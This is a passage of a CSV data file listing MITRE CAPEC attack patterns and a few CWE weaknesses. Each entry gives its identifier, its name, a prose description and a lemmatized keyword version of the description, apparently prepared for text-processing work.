assist developer determine trusted individual organization provide source code code update relative popularity software adversary spoof metadata repository contain malicious code appear originate trusted source frequently maintain commonly developer perform additional security activity unassuming developer dupe spoof metadata include malicious code system application adversary ultimately able achieve numerous negative technical impact victim remain unaware malicious activity
CAPEC-693,StarJacking,"An adversary spoofs software popularity metadata to deceive users into believing that a maliciously provided package is widely used and originates from a trusted source.Many open-source software packages are hosted via third-party package managers (e.g., Node Package Manager, PyPi, Yarn, etc.) that allow for easy integration of software components into existing development environments. A package manager will typically include various metadata about the software and often include a link to the package's source code repository, to assist developers in determining the trustworthiness of the software. One common statistic used in this decision-making process is the popularity of the package. This entails checking the amount of ""Stars"" the package has received, which the package manager displays based on the provided source code repository URL. However, many package managers do not validate the connection between the package and source code repository being provided. Adversaries can thus spoof the popularity statistic of a malicious package by associating a popular source code repository URL with the package. This can ultimately trick developers into unintentionally incorporating the malicious package into their development environment.",adversary spoof software popularity metadata deceive user believe maliciously provide package widely originate trusted source open source software package host party package manager node package manager pypi yarn etc allow easy integration software component exist development environment package manager typically include metadata software include link package source code repository assist developer determine trustworthiness software common statistic decision making process popularity package entail check star package receive package manager display base provide source code repository url package manager validate connection package source code repository provide adversary spoof popularity statistic malicious package associate popular source code repository url package ultimately trick developer unintentionally incorporate malicious package development environment
CAPEC-694,System Location Discovery,"An adversary collects information about the target system in an attempt to identify the system's geographical location.Information gathered could include keyboard layout, system language, and timezone. This information may benefit an adversary in confirming the desired target and/or tailoring further attacks.",adversary collect information target system attempt identify system geographical location information gather include keyboard layout system language timezone information benefit adversary confirm desire target tailor attack
CAPEC-695,Repo Jacking,"An adversary takes advantage of the redirect property of directly linked Version Control System (VCS) repositories to trick users into incorporating malicious code into their applications.Software developers may directly reference a VCS repository (i.e., via a hardcoded URL) within source code to integrate the repository as a dependency for the underlying application. If the repository owner/maintainer modifies the repository name, changes their VCS username, or transfers ownership of the repository, the VCS implements a redirect to the new repository location so that existing software referencing the repository will not break. However, if the original location of the repository is reestablished, the VCS will revert to resolving the hardcoded path. Adversaries may, therefore, re-register deleted or previously used usernames and recreate repositories with malicious code to infect applications referencing the repository. When an application then fetches the desired dependency, it will now reference the adversary's malicious repository since the hardcoded repository path is once again active. This ultimately allows the adversary to infect numerous applications, while achieving a variety of negative technical impacts.",adversary take advantage redirect property directly link version control system vcs repository trick user incorporate malicious code application software developer directly reference vcs repository hardcode url source code integrate repository dependency underlie application repository owner maintainer modify repository change vcs username transfer ownership repository vcs implement redirect new repository location exist software reference repository break original location repository reestablish vcs revert resolve hardcode path adversary register delete previously username recreate repository malicious code infect application reference repository application fetch desire dependency reference adversary malicious repository hardcode repository path active ultimately allow adversary infect numerous application achieve variety negative technical impact
CAPEC-696,Load Value Injection,"An adversary exploits a hardware design flaw in a CPU implementation of transient instruction execution in which a faulting or assisted load instruction transiently forwards adversary-controlled data from microarchitectural buffers. By inducing a page fault or microcode assist during victim execution, an adversary can force legitimate victim execution to operate on the adversary-controlled data which is stored in the microarchitectural buffers. The adversary can then use existing code gadgets and side channel analysis to discover victim secrets that have not yet been flushed from microarchitectural state or hijack the system control flow.This attack is a mix of techniques used in traditional Meltdown and Spectre attacks. It uses microarchitectural data leakage combined with code gadget abuse. Intel has identified that this attack is not applicable in scenarios where the OS and the VMM (Virtual Memory Manager) are both trusted. Because of this, Intel SGX is a prime target for this attack because it assumes that the OS or VMM may be malicious.",adversary exploit hardware design flaw cpu implementation transient instruction execution faulting assist load instruction transiently forward adversary control datum microarchitectural buffer induce page fault microcode assist victim execution adversary force legitimate victim execution operate adversary control data store microarchitectural buffer adversary use exist code gadget channel analysis discover victim secret flush microarchitectural state hijack system control flow attack mix technique traditional meltdown spectre attack use microarchitectural datum leakage combine code gadget abuse intel identify attack applicable scenario os vmm virtual memory manager trust intel sgx prime target attack assume os vmm malicious
CAPEC-697,DHCP Spoofing,"An adversary masquerades as a legitimate Dynamic Host Configuration Protocol (DHCP) server by spoofing DHCP traffic, with the goal of redirecting network traffic or denying service to DHCP.DHCP is broadcast to the entire Local Area Network (LAN) and does not have any form of authentication by default. Therefore, it is susceptible to spoofing.An adversary with access to the target LAN can receive DHCP messages; obtaining the topology information required to potentially manipulate other hosts' network configurations.To improve the likelihood of the DHCP request being serviced by the Rogue server, an adversary can first starve the DHCP pool.",adversary masquerade legitimate dynamic host configuration protocol dhcp server spoof dhcp traffic goal redirect network traffic deny service broadcast entire local area network lan form authentication default susceptible spoofing adversary access target lan receive dhcp message obtain topology information require potentially manipulate host network configuration improve likelihood dhcp request service rogue server adversary starve dhcp pool
CAPEC-698,Install Malicious Extension,"An adversary directly installs or tricks a user into installing a malicious extension into existing trusted software, with the goal of achieving a variety of negative technical impacts.Many software applications allow users to install third-party software extensions/plugins that provide additional features and functionality. Adversaries can take advantage of this behavior to install malware on a system with relative ease. This may require the adversary compromising a system and then installing the malicious extension themself. An alternate approach entails masquerading the malicious extension as a legitimate extension. The adversary then convinces users to install the malicious component, via means such as social engineering, or simply waits for victims to unknowingly install the malware on their systems. Once the malicious extension has been installed, the adversary can achieve a variety of negative technical impacts such as obtaining sensitive information, executing unauthorized commands, observing/modifying network traffic, and more.",adversary directly install trick user instal malicious extension exist trusted software goal achieve variety negative technical impact software application allow user install party software extension plugin provide additional feature functionality adversary advantage behavior install malware system relative ease require adversary compromise system instal malicious extension themself alternate approach entail masquerade malicious extension legitimate extension adversary convince user install malicious component mean social engineering simply wait victim unknowingly install malware system malicious extension instal adversary achieve variety negative technical impact obtain sensitive information execute unauthorized command observe modify network traffic
CAPEC-699,Eavesdropping on a Monitor,"An Adversary can eavesdrop on the content of an external monitor through the air without modifying any cable or installing software, just capturing this signal emitted by the cable or video port, with this the attacker will be able to impact the confidentiality of the data without being detected by traditional security toolsThis attack gives the adversary the ability to view an external monitor with an insignificant delay. There is also no indicator of compromise from the victim visible on the monitor.The eavesdrop is possible due to a signal leakage, that is produced at different points of the connection, including the source port, the connection between the cable and PC, the cable itself, and the connection between the cable and the monitor. That signal leakage can be captured near any of the leak points, but also in a near location, like the next room or a few meters away, using an SDR (Software-defined Radio) device and the correspondent software, that process and interpret the signal to show attackers what the monitor is displaying.From the victim’s point of view, this specified attack might cause a high risk, and from the other hand, from the attacker’s point of view, the attack is excellent, since the specified attack method can be used without investing too much effort or require too many skills, as long as the right attack tool is in right place, this allows attackers to completely compromise the confidentiality of the data; also giving the attacker the advantage of being undetectable by not only traditional security products but also from bug sweep because the SDR device is acting in passive mode.",adversary eavesdrop content external monitor air modify cable instal software capture signal emit cable video port attacker able impact confidentiality datum detect traditional security toolsthi attack give adversary ability view external monitor insignificant delay indicator compromise victim visible monitor eavesdrop possible signal leakage produce different point connection include source port connection cable pc cable connection cable monitor signal leakage capture near leak point near location like room meter away sdr software define radio device correspondent software process interpret signal attacker monitor display victim point view specify attack cause high risk hand attacker point view attack excellent specify attack method invest effort require skill long right attack tool right place allow attacker completely compromise confidentiality datum give attacker advantage undetectable traditional security product bug sweep sdr device act passive mode
CAPEC-7,Blind SQL Injection,"Blind SQL Injection results from an insufficient mitigation for SQL Injection. Although suppressing database error messages are considered best practice, the suppression alone is not sufficient to prevent SQL Injection. Blind SQL Injection is a form of SQL Injection that overcomes the lack of error messages. Without the error messages that facilitate SQL Injection, the adversary constructs input strings that probe the target through simple Boolean SQL expressions. The adversary can determine if the syntax and structure of the injection was successful based on whether the query was executed or not. Applied iteratively, the adversary determines how and where the target is vulnerable to SQL Injection.",blind sql injection result insufficient mitigation sql injection suppress database error message consider good practice suppression sufficient prevent sql injection blind sql injection form sql injection overcome lack error message error message facilitate sql injection adversary construct input string probe target simple boolean sql expression adversary determine syntax structure injection successful base query execute apply iteratively adversary determine target vulnerable sql injection
CAPEC-70,Try Common or Default Usernames and Passwords,"An adversary may try certain common or default usernames and passwords to gain access into the system and perform unauthorized actions. An adversary may try an intelligent brute force using empty passwords, known vendor default credentials, as well as a dictionary of common usernames and passwords. Many vendor products come preconfigured with default (and thus well-known) usernames and passwords that should be deleted prior to usage in a production environment. It is a common mistake to forget to remove these default login credentials. Another problem is that users would pick very simple (common) passwords (e.g. ""secret"" or ""password"") that make it easier for the attacker to gain access to the system compared to using a brute force attack or even a dictionary attack using a full dictionary.",adversary try certain common default username password gain access system perform unauthorized action adversary try intelligent brute force password know vendor default credential dictionary common username password vendor product come preconfigured default know username password delete prior usage production environment common mistake forget remove default login credential problem user pick simple common password secret password easier attacker gain access system compare brute force attack dictionary attack dictionary
CAPEC-700,Network Boundary Bridging,"An adversary which has gained elevated access to network boundary devices may use these devices to create a channel to bridge trusted and untrusted networks. Boundary devices do not necessarily have to be on the network’s edge, but rather must serve to segment portions of the target network the adversary wishes to cross into.Network boundary devices are network devices such as routers and firewalls which segment networks by restricting certain types of traffic from flowing through the device. Network boundary devices are often directly accessible through a portal page for management purposes. An adversary’s goal when conducting network boundary bridging is to connect networks which are being segmented by the device. To do so, the adversary must first compromise the network boundary device.",adversary gain elevated access network boundary device use device create channel bridge trusted untrusted network boundary device necessarily network edge serve segment portion target network adversary wish cross network boundary device network device router firewall segment network restrict certain type traffic flow device network boundary device directly accessible portal page management purpose adversary goal conduct network boundary bridging connect network segment device adversary compromise network boundary device
CAPEC-701,Browser in the Middle (BiTM),"An adversary exploits the inherent functionalities of a web browser, in order to establish an unnoticed remote desktop connection in the victim's browser to the adversary's system. The adversary must deploy a web client with a remote desktop session that the victim can access.Unlike Adversary in the Browser, the victim does not need to install a malicious application. Browser in the Middle uses the inherent functionalities of a web browser to convince the victim they are browsing normally under the assumption that the connection is secure. All the actions performed by the victim in the open window are actually performed on the machine of the adversary. These victim-authenticated sessions are available to the adversary to use. All entered data such as passwords and usernames can be logged by the adversary and the content displayed to the victim can be altered arbitrarily. Varieties of multifactor authentication which rely solely on user input and do not use a form of hardware-based secret exchange are vulnerable to browser in the middle.",adversary exploit inherent functionality web browser order establish unnoticed remote desktop connection victim browser adversary system adversary deploy web client remote desktop session victim access unlike adversary browser victim need install malicious application browser middle use inherent functionality web browser convince victim browse normally assumption connection secure action perform victim open window actually perform machine adversary victim authenticate session available adversary use enter datum password username log adversary content display victim alter arbitrarily variety multifactor authentication rely solely user input use form hardware base secret exchange vulnerable browser middle
CAPEC-702,Exploiting Incorrect Chaining or Granularity of Hardware Debug Components,"An adversary exploits incorrect chaining or granularity of hardware debug components in order to gain unauthorized access to debug functionality on a chip. This happens when authorization is not checked on a per function basis and is assumed for a chain or group of debug functionality.Chip designers often include design elements in a chip for debugging and troubleshooting such as:Various Test Access Ports (TAPs) which allow boundary scan commands to be executed.Scan cells that allow the chip to be used as a ""stimulus and response"" mechanism for scanning the internal components of a chip.Custom methods to observe the internal components of their chips by placing various tracing hubs within their chip and creating hierarchical or interconnected structures among those hubs.Because devices commonly have multiple chips and debug components, designers will connect debug components and expose them through a single external interface, which is referred to as “chaining”. Logic errors during design or synthesis could misconfigure the chaining of the debug components, which could allow unintended access. TAPs are also commonly referred to as JTAG interfaces.",adversary exploit incorrect chaining granularity hardware debug component order gain unauthorized access debug functionality chip happen authorization check function basis assume chain group debug functionality chip designer include design element chip debugging troubleshooting test access ports taps allow boundary scan command execute scan cell allow chip stimulus response mechanism scan internal component chip custom method observe internal component chip place tracing hub chip create hierarchical interconnected structure hub device commonly multiple chip debug component designer connect debug component expose single external interface refer chaining logic error design synthesis misconfigure chaining debug component allow unintended access taps commonly refer jtag interface
CAPEC-71,Using Unicode Encoding to Bypass Validation Logic,An attacker may provide a Unicode string to a system component that is not Unicode aware and use that to circumvent the filter or cause the classifying mechanism to fail to properly understanding the request. That may allow the attacker to slip malicious data past the content filter and/or possibly cause the application to route the request incorrectly.,attacker provide unicode string system component unicode aware use circumvent filter cause classifying mechanism fail properly understand request allow attacker slip malicious datum past content filter possibly cause application route request incorrectly
CAPEC-72,URL Encoding,"This attack targets the encoding of the URL. An adversary can take advantage of the multiple way of encoding an URL and abuse the interpretation of the URL.A URL may contain special character that need special syntax handling in order to be interpreted. Special characters are represented using a percentage character followed by two digits representing the octet code of the original character (%HEX-CODE).For instance US-ASCII space character would be represented with %20. This is often referred as escaped ending or percent-encoding. Since the server decodes the URL from the requests, it may restrict the access to some URL paths by validating and filtering out the URL requests it received. An adversary will try to craft an URL with a sequence of special characters which once interpreted by the server will be equivalent to a forbidden URL.It can be difficult to protect against this attack since the URL can contain other format of encoding such as UTF-8 encoding, Unicode-encoding, etc. The adversary could also subvert the meaning of the URL string request by encoding the data being sent to the server through a GET request. For instance an adversary may subvert the meaning of parameters used in a SQL request and sent through the URL string (See Example section).",attack target encoding url adversary advantage multiple way encode url abuse interpretation url contain special character need special syntax handling order interpret special character represent percentage character follow digit represent octet code original character hex instance ascii space character represent refer escape ending percent encoding server decode url request restrict access url path validate filter url request receive adversary try craft url sequence special character interpret server equivalent forbidden difficult protect attack url contain format encoding encoding unicode encoding etc adversary subvert meaning url string request encode datum send server request instance adversary subvert meaning parameter sql request send url string example section
CAPEC-73,User-Controlled Filename,"An attack of this type involves an adversary inserting malicious characters (such as a XSS redirection) into a filename, directly or indirectly that is then used by the target software to generate HTML text or other potentially executable content. Many websites rely on user-generated content and dynamically build resources like files, filenames, and URL links directly from user supplied data. In this attack pattern, the attacker uploads code that can execute in the client browser and/or redirect the client browser to a site that the attacker owns. All XSS attack payload variants can be used to pass and exploit these vulnerabilities.",attack type involve adversary insert malicious character xss redirection filename directly indirectly target software generate html text potentially executable content website rely user generate content dynamically build resource like file filename url link directly user supply datum attack pattern attacker upload code execute client browser redirect client browser site attacker own xss attack payload variant pass exploit vulnerability
CAPEC-74,Manipulating State,"The adversary modifies state information maintained by the target software or causes a state transition in hardware. If successful, the target will use this tainted state and execute in an unintended manner.State management is an important function within a software application. User state maintained by the application can include usernames, payment information, browsing history as well as application-specific contents such as items in a shopping cart. Manipulating user state can be employed by an adversary to elevate privilege, conduct fraudulent transactions or otherwise modify the flow of the application to derive certain benefits.If there is a hardware logic error in a finite state machine, the adversary can use this to put the system in an undefined state which could cause a denial of service or exposure of secure data.",adversary modify state information maintain target software cause state transition hardware successful target use tainted state execute unintended manner state management important function software application user state maintain application include username payment information browsing history application specific content item shopping cart manipulate user state employ adversary elevate privilege conduct fraudulent transaction modify flow application derive certain benefit hardware logic error finite state machine adversary use system undefined state cause denial service exposure secure datum
CAPEC-75,Manipulating Writeable Configuration Files,"Generally these are manually edited files that are not in the preview of the system administrators, any ability on the attackers' behalf to modify these files, for example in a CVS repository, gives unauthorized access directly to the application, the same as authorized users.",generally manually edit file preview system administrator ability attacker behalf modify file example cvs repository give unauthorized access directly application authorized user
CAPEC-76,Manipulating Web Input to File System Calls,"An attacker manipulates inputs to the target software which the target software passes to file system calls in the OS. The goal is to gain access to, and perhaps modify, areas of the file system that the target software did not intend to be accessible.",attacker manipulate input target software target software pass file system call os goal gain access modify area file system target software intend accessible
CAPEC-77,Manipulating User-Controlled Variables,"This attack targets user controlled variables (DEBUG=1, PHP Globals, and So Forth). An adversary can override variables leveraging user-supplied, untrusted query variables directly used on the application server without any data sanitization. In extreme cases, the adversary can change variables controlling the business logic of the application. For instance, in languages like PHP, a number of poorly set default configurations may allow the user to override variables.",attack target user control variable php globals forth adversary override variable leverage user supply untrusted query variable directly application server datum sanitization extreme case adversary change variable control business logic application instance language like php number poorly set default configuration allow user override variable
CAPEC-78,Using Escaped Slashes in Alternate Encoding,"This attack targets the use of the backslash in alternate encoding. An adversary can provide a backslash as a leading character and causes a parser to believe that the next character is special. This is called an escape. By using that trick, the adversary tries to exploit alternate ways to encode the same character which leads to filter problems and opens avenues to attack.",attack target use backslash alternate encoding adversary provide backslash lead character cause parser believe character special call escape trick adversary try exploit alternate way encode character lead filter problem open avenue attack
CAPEC-79,Using Slashes in Alternate Encoding,"This attack targets the encoding of the Slash characters. An adversary would try to exploit common filtering problems related to the use of the slashes characters to gain access to resources on the target host. Directory-driven systems, such as file systems and databases, typically use the slash character to indicate traversal between directories or other container components. For murky historical reasons, PCs (and, as a result, Microsoft OSs) choose to use a backslash, whereas the UNIX world typically makes use of the forward slash. The schizophrenic result is that many MS-based systems are required to understand both forms of the slash. This gives the adversary many opportunities to discover and abuse a number of common filtering problems. The goal of this pattern is to discover server software that only applies filters to one version, but not the other.",attack target encoding slash character adversary try exploit common filtering problem relate use slash character gain access resource target host directory drive system file system database typically use slash character indicate traversal directory container component murky historical reason pc result microsoft os choose use backslash unix world typically make use forward slash schizophrenic result ms base system require understand form slash give adversary opportunity discover abuse number common filtering problem goal pattern discover server software apply filter version
CAPEC-8,Buffer Overflow in an API Call,"This attack targets libraries or shared code modules which are vulnerable to buffer overflow attacks. An adversary who has knowledge of known vulnerable libraries or shared code can easily target software that makes use of these libraries. All clients that make use of the code library thus become vulnerable by association. This has a very broad effect on security across a system, usually affecting more than one software process.",attack target library share code module vulnerable buffer overflow attack adversary knowledge know vulnerable library share code easily target software make use library client use code library vulnerable association broad effect security system usually affect software process
CAPEC-80,Using UTF-8 Encoding to Bypass Validation Logic,"This attack is a specific variation on leveraging alternate encodings to bypass validation logic. This attack leverages the possibility to encode potentially harmful input in UTF-8 and submit it to applications not expecting or effective at validating this encoding standard making input filtering difficult. UTF-8 (8-bit UCS/Unicode Transformation Format) is a variable-length character encoding for Unicode. Legal UTF-8 characters are one to four bytes long. However, early version of the UTF-8 specification got some entries wrong (in some cases it permitted overlong characters). UTF-8 encoders are supposed to use the ""shortest possible"" encoding, but naive decoders may accept encodings that are longer than necessary. According to the RFC 3629, a particularly subtle form of this attack can be carried out against a parser which performs security-critical validity checks against the UTF-8 encoded form of its input, but interprets certain illegal octet sequences as characters.",attack specific variation leverage alternate encoding bypass validation logic attack leverage possibility encode potentially harmful input submit application expect effective validate encoding standard make input filtering difficult bit ucs unicode transformation format variable length character encoding unicode legal character byte long early version specification get entry wrong case permit overlong character encoder suppose use short possible encoding naive decoder accept encoding long necessary accord rfc particularly subtle form attack carry parser perform security critical validity check encode form input interpret certain illegal octet sequence character
CAPEC-81,Web Server Logs Tampering,"Web Logs Tampering attacks involve an attacker injecting, deleting or otherwise tampering with the contents of web logs typically for the purposes of masking other malicious behavior. Additionally, writing malicious data to log files may target jobs, filters, reports, and other agents that process the logs in an asynchronous attack pattern. This pattern of attack is similar to ""Log Injection-Tampering-Forging"" except that in this case, the attack is targeting the logs of the web server and not the application.",web log tampering attack involve attacker inject delete tamper content web log typically purpose mask malicious behavior additionally write malicious datum log file target job filter report agent process log asynchronous attack pattern pattern attack similar log injection tampering forging case attack target log web server application
CAPEC-83,XPath Injection,"An attacker can craft special user-controllable input consisting of XPath expressions to inject the XML database and bypass authentication or glean information that they normally would not be able to. XPath Injection enables an attacker to talk directly to the XML database, thus bypassing the application completely. XPath Injection results from the failure of an application to properly sanitize input used as part of dynamic XPath expressions used to query an XML database.",attacker craft special user controllable input consist xpath expression inject xml database bypass authentication glean information normally able xpath injection enable attacker talk directly xml database bypass application completely xpath injection result failure application properly sanitize input dynamic xpath expression query xml database
CAPEC-84,XQuery Injection,"This attack utilizes XQuery to probe and attack server systems; in a similar manner that SQL Injection allows an attacker to exploit SQL calls to RDBMS, XQuery Injection uses improperly validated data that is passed to XQuery commands to traverse and execute commands that the XQuery routines have access to. XQuery injection can be used to enumerate elements on the victim's environment, inject commands to the local host, or execute queries to remote files and data sources.",attack utilize xquery probe attack server system similar manner sql injection allow attacker exploit sql call rdbms xquery injection use improperly validate datum pass xquery command traverse execute command xquery routine access xquery injection enumerate element victim environment inject command local host execute query remote file data source
CAPEC-85,AJAX Footprinting,"This attack utilizes the frequent client-server roundtrips in Ajax conversation to scan a system. While Ajax does not open up new vulnerabilities per se, it does optimize them from an attacker point of view. A common first step for an attacker is to footprint the target environment to understand what attacks will work. Since footprinting relies on enumeration, the conversational pattern of rapid, multiple requests and responses that are typical in Ajax applications enable an attacker to look for many vulnerabilities, well-known ports, network locations and so on. The knowledge gained through Ajax fingerprinting can be used to support other attacks, such as XSS.",attack utilize frequent client server roundtrip ajax conversation scan system ajax open new vulnerability se optimize attacker point view common step attacker footprint target environment understand attack work footprinting rely enumeration conversational pattern rapid multiple request response typical ajax application enable attacker look vulnerability know port network location knowledge gain ajax fingerprinting support attack xss
CAPEC-86,XSS Through HTTP Headers,"An adversary exploits web applications that generate web content, such as links in a HTML page, based on unvalidated or improperly validated data submitted by other actors. XSS in HTTP Headers attacks target the HTTP headers which are hidden from most users and may not be validated by web applications.",adversary exploit web application generate web content link html page base unvalidated improperly validate datum submit actor xss http header attack target http header hide user validate web application
CAPEC-87,Forceful Browsing,"An attacker employs forceful browsing (direct URL entry) to access portions of a website that are otherwise unreachable. Usually, a front controller or similar design pattern is employed to protect access to portions of a web application. Forceful browsing enables an attacker to access information, perform privileged operations and otherwise reach sections of the web application that have been improperly protected.",attacker employ forceful browsing direct url entry access portion website unreachable usually controller similar design pattern employ protect access portion web application forceful browsing enable attacker access information perform privileged operation reach section web application improperly protect
CAPEC-88,OS Command Injection,"In this type of an attack, an adversary injects operating system commands into existing application functions. An application that uses untrusted input to build command strings is vulnerable. An adversary can leverage OS command injection in an application to elevate privileges, execute arbitrary commands and compromise the underlying operating system.",type attack adversary inject operate system command existing application function application use untrusted input build command string vulnerable adversary leverage os command injection application elevate privilege execute arbitrary command compromise underlying operate system
CAPEC-89,Pharming,"A pharming attack occurs when the victim is fooled into entering sensitive data into supposedly trusted locations, such as an online bank site or a trading platform. An attacker can impersonate these supposedly trusted sites and have the victim be directed to their site rather than the originally intended one. Pharming does not require script injection or clicking on malicious links for the attack to succeed.",pharming attack occur victim fool enter sensitive datum supposedly trust location online bank site trading platform attacker impersonate supposedly trust site victim direct site originally intend pharming require script injection click malicious link attack succeed
CAPEC-9,Buffer Overflow in Local Command-Line Utilities,This attack targets command-line utilities available in a number of shells. An adversary can leverage a vulnerability found in a command-line utility to escalate privilege to root.,attack target command line utility available number shell adversary leverage vulnerability find command line utility escalate privilege root
CAPEC-90,Reflection Attack in Authentication Protocol,"An adversary can abuse an authentication protocol susceptible to reflection attack in order to defeat it. Doing so allows the adversary illegitimate access to the target system, without possessing the requisite credentials. Reflection attacks are of great concern to authentication protocols that rely on a challenge-handshake or similar mechanism. An adversary can impersonate a legitimate user and can gain illegitimate access to the system by successfully mounting a reflection attack during authentication.",adversary abuse authentication protocol susceptible reflection attack order defeat allow adversary illegitimate access target system possess requisite credential reflection attack great concern authentication protocol rely challenge handshake similar mechanism adversary impersonate legitimate user gain illegitimate access system successfully mount reflection attack authentication
CAPEC-92,Forced Integer Overflow,"This attack forces an integer variable to go out of range. The integer variable is often used as an offset such as size of memory allocation or similarly. The attacker would typically control the value of such variable and try to get it out of range. For instance the integer in question is incremented past the maximum possible value, it may wrap to become a very small, or negative number, therefore providing a very incorrect value which can lead to unexpected behavior. At worst the attacker can execute arbitrary code.",attack force integer variable range integer variable offset size memory allocation similarly attacker typically control value variable try range instance integer question incremente past maximum possible value wrap small negative number provide incorrect value lead unexpected behavior worst attacker execute arbitrary code
CAPEC-93,Log Injection-Tampering-Forging,"This attack targets the log files of the target host. The attacker injects, manipulates or forges malicious log entries in the log file, allowing them to mislead a log audit, cover traces of attack, or perform other malicious actions. The target host is not properly controlling log access. As a result tainted data is resulting in the log files leading to a failure in accountability, non-repudiation and incident forensics capability.",attack target log file target host attacker inject manipulate forge malicious log entry log file allow mislead log audit cover trace attack perform malicious action target host properly control log access result tainted datum result log file lead failure accountability non repudiation incident forensic capability
CAPEC-94,Adversary in the Middle (AiTM),"An adversary targets the communication between two components (typically client and server), in order to alter or obtain data from transactions. A general approach entails the adversary placing themself within the communication channel between the two components.Whenever one component attempts to communicate with the other (data flow, authentication challenges, etc.), the data first flows through the adversary, who has the opportunity to observe or alter it, before being passed on to the intended recipient as if it was never observed. This interposition is transparent leaving the two compromised components unaware of the potential corruption or leakage of their communications. The potential for these attacks yields an implicit lack of trust in communication or identify between two components.These attacks differ from Sniffing Attacks (CAPEC-157) since these attacks often modify the communications prior to delivering it to the intended recipient.",adversary target communication component typically client server order alter obtain datum transaction general approach entail adversary place themself communication channel component component attempt communicate data flow authentication challenge etc data flow adversary opportunity observe alter pass intended recipient observe interposition transparent leave compromise component unaware potential corruption leakage communication potential attack yield implicit lack trust communication identify component attack differ sniffing attacks attack modify communication prior deliver intended recipient
CAPEC-95,WSDL Scanning,"This attack targets the WSDL interface made available by a web service. The attacker may scan the WSDL interface to reveal sensitive information about invocation patterns, underlying technology implementations and associated vulnerabilities. This type of probing is carried out to perform more serious attacks (e.g. parameter tampering, malicious content injection, command injection, etc.). WSDL files provide detailed information about the services ports and bindings available to consumers. For instance, the attacker can submit special characters or malicious content to the Web service and can cause a denial of service condition or illegal access to database records. In addition, the attacker may try to guess other private methods by using the information provided in the WSDL files.",attack target wsdl interface available web service attacker scan wsdl interface reveal sensitive information invocation pattern underlie technology implementation associate vulnerability type probing carry perform attack parameter tampering malicious content injection command injection etc wsdl file provide detailed information service port binding available consumer instance attacker submit special character malicious content web service cause denial service condition illegal access database record addition attacker try guess private method information provide wsdl file
CAPEC-96,Block Access to Libraries,"An application typically makes calls to functions that are a part of libraries external to the application. These libraries may be part of the operating system or they may be third party libraries. It is possible that the application does not handle situations properly where access to these libraries has been blocked. Depending on the error handling within the application, blocked access to libraries may leave the system in an insecure state that could be leveraged by an attacker.",application typically make call function library external application library operate system party library possible application handle situation properly access library block depend error handling application block access library leave system insecure state leverage attacker
CAPEC-97,Cryptanalysis,"Cryptanalysis is a process of finding weaknesses in cryptographic algorithms and using these weaknesses to decipher the ciphertext without knowing the secret key (instance deduction). Sometimes the weakness is not in the cryptographic algorithm itself, but rather in how it is applied that makes cryptanalysis successful. An attacker may have other goals as well, such as: Total Break (finding the secret key), Global Deduction (finding a functionally equivalent algorithm for encryption and decryption that does not require knowledge of the secret key), Information Deduction (gaining some information about plaintexts or ciphertexts that was not previously known) and Distinguishing Algorithm (the attacker has the ability to distinguish the output of the encryption (ciphertext) from a random permutation of bits).",cryptanalysis process find weakness cryptographic algorithm weakness decipher ciphertext know secret key instance deduction weakness cryptographic algorithm apply make cryptanalysis successful attacker goal total break find secret key global deduction find functionally equivalent algorithm encryption decryption require knowledge secret key information deduction gain information plaintext ciphertext previously know distinguishing algorithm attacker ability distinguish output encryption ciphertext random permutation bit
CAPEC-98,Phishing,"Phishing is a social engineering technique where an attacker masquerades as a legitimate entity with which the victim might do business in order to prompt the user to reveal some confidential information (very frequently authentication credentials) that can later be used by an attacker. Phishing is essentially a form of information gathering or ""fishing"" for information.",phishing social engineering technique attacker masquerade legitimate entity victim business order prompt user reveal confidential information frequently authentication credential later attacker phishing essentially form information gathering fishing information
CWE-1004,Sensitive Cookie Without 'HttpOnly' Flag,"The product uses a cookie to store sensitive information, but the cookie is not marked with the HttpOnly flag.The HttpOnly flag directs compatible browsers to prevent client-side script from accessing cookies. Including the HttpOnly flag in the Set-Cookie HTTP response header helps mitigate the risk associated with Cross-Site Scripting (XSS) where an attacker's script code might attempt to read the contents of a cookie and exfiltrate information obtained. When set, browsers that support the flag will not reveal the contents of the cookie to a third party via client-side script executed via XSS.",product use cookie store sensitive information cookie mark httponly flag httponly flag direct compatible browser prevent client script access cookie include httponly flag set cookie http response header help mitigate risk associate cross site scripting xss attacker script code attempt read content cookie exfiltrate information obtain set browser support flag reveal content cookie party client script execute xss
CWE-1007,Insufficient Visual Distinction of Homoglyphs Presented to User,"The product displays information or identifiers to a user, but the display mechanism does not make it easy for the user to distinguish between visually similar or identical glyphs (homoglyphs), which may cause the user to misinterpret a glyph and perform an unintended, insecure action.Some glyphs, pictures, or icons can be semantically distinct to a program, while appearing very similar or identical to a human user. These are referred to as homoglyphs. For example, the lowercase ""l"" (ell) and uppercase ""I"" (eye) have different character codes, but these characters can be displayed in exactly the same way to a user, depending on the font. This can also occur between different character sets. For example, the Latin capital letter ""A"" and the Greek capital letter ""Α"" (Alpha) are treated as distinct by programs, but may be displayed in exactly the same way to a user. Accent marks may also cause letters to appear very similar, such as the Latin capital letter grave mark ""À"" and its equivalent ""Á"" with the acute accent.Adversaries can exploit this visual similarity for attacks such as phishing, e.g. by providing a link to an attacker-controlled hostname that looks like a hostname that the victim trusts. In a different use of homoglyphs, an adversary may create a back door username that is visually similar to the username of a regular user, which then makes it more difficult for a system administrator to detect the malicious username while reviewing logs.",product display information identifier user display mechanism easy user distinguish visually similar identical glyph homoglyph cause user misinterpret glyph perform unintended insecure action glyph picture icon semantically distinct program appear similar identical human user refer homoglyph example lowercase l ell uppercase eye different character code character display exactly way user depend font occur different character set example latin capital letter greek capital letter α alpha treat distinct program display exactly way user accent mark cause letter appear similar latin capital letter grave mark à equivalent á acute accent adversary exploit visual similarity attack phishing provide link attacker control hostname look like hostname victim trust different use homoglyph adversary create door username visually similar username regular user make difficult system administrator detect malicious username review log
CWE-102,Struts: Duplicate Validation Forms,"The product uses multiple validation forms with the same name, which might cause the Struts Validator to validate a form that the programmer does not expect.If two validation forms have the same name, the Struts Validator arbitrarily chooses one of the forms to use for input validation and discards the other. This decision might not correspond to the programmer's expectations, possibly leading to resultant weaknesses. Moreover, it indicates that the validation logic is not up-to-date, and can indicate that other, more subtle validation errors are present.",product use multiple validation form cause struts validator validate form programmer expect validation form struts validator arbitrarily choose form use input validation discard decision correspond programmer expectation possibly lead resultant weakness indicate validation logic date indicate subtle validation error present
